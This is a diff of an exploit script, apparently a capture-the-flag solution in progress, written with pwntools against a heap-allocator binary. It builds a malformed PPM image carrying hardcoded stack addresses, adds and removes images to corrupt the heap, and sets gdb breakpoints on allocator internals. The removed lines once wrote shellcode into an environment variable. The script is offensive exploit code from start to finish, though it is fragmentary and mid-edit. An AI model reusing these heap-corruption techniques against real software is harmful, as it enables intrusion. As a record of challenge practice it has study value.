@@ -6,9 +6,10 @@ import ctypes
 
 
 
-exe = ELF("./9_patched")
+exe = ELF("9")
 
 context.binary = exe
+context.terminal = ['tmux', 'splitw', '-v']
 
 vlas = """             x/10gx $rax
             x/20gx &entries     
@@ -35,10 +36,11 @@ def conn():
         r = process([exe.path])
         if args.DEB:
             gdb.attach(r, gdbscript="""
-            b *parse_image+426
-            b *add_image+0x032f
+	    b *parse_image+426
+            b *free_list_remove
             c
         """)
+
 
     return r
 
@@ -94,22 +96,15 @@ def write_ppm(filename):
         f.write(b"255\n")
 
         # Write raw RGB pixel data
-        f.write(b"\x50"*1)
+        f.write(b"\x4a"*1)
         f.write(b"\x00"*7) # 7 for the rest of the size
 
       
         ToWrite =(0x7fa8b9f7c1f0 - 0x7fa8b9f7c058) / 8
-        f.write(b"\x00"*8)
-        f.write(b"\x00"*8)
-        f.write(b"\x00"*8)
-        f.write(b"\xaa"*376)
-        f.write(b"\xaa\x01")
-        f.write(b"\x00"*6)
-        f.write(b"\x00"*8)
-        f.write(p64(0x7fffffffe490))
-        f.write(p64(0x7fffffffe490))
+        f.write(p64(0x7fffffffe478))
+        #f.write(p64(0x7fffffffe480))
 
-        # overwrite = 0x7fffffffe488
+
         #f.write(b"\xff"*100)
         # free_next
         #f.write(b"\xff"*8)
@@ -124,12 +119,9 @@ def main():
     # ctypes.c_size_t represents C's size_t
     # Overwriting 0x0000000000000418	0x0000000000000000
         #0x730af12d9080:	0x0000730af12d97b8	0x0000730af12d9050
-        #0x730af12d9090:	0x4b55544e796f514d	0x7171717171717171
+	        #0x730af12d9090:	0x4b55544e796f514d	0x7171717171717171
     # libc_offset = 0x000074fae68cc400 - 0x000074fae6600000
     image_file_name = "image.ppm"
-    with open("shellcode", "wb") as f:
-        f.write(data)
-    print('export HOSTNAME="$(cat shellcode)"')
     write_ppm(image_file_name)
     image_data = open(image_file_name, "rb").read()
     image_data_b64 = base64.standard_b64encode(image_data)
@@ -139,13 +131,10 @@ def main():
     overwrite = b"UDYKMSAxCjI1NQq7u7u7u7u7u7u7u7s3222212="
     #add_image(r, image_name, base64.standard_b64encode(image_data))
     name = "A"*16
-    add_image(r, "F"*(400 - 16), overwrite)
-    add_image(r, "F"*(400 - 16), overwrite)
-    remove_image(r, b"0")
     add_image(r, name, image_data_b64)
-    remove_image(r, b"0")
-    add_image(r, name, overwrite)
-    add_image(r, name, overwrite)
+    #remove_image(r, b"0")
+    #add_image(r, name, overwrite)
+    add_image(r, "A", overwrite)
     r.interactive()
 
     show_images(r)
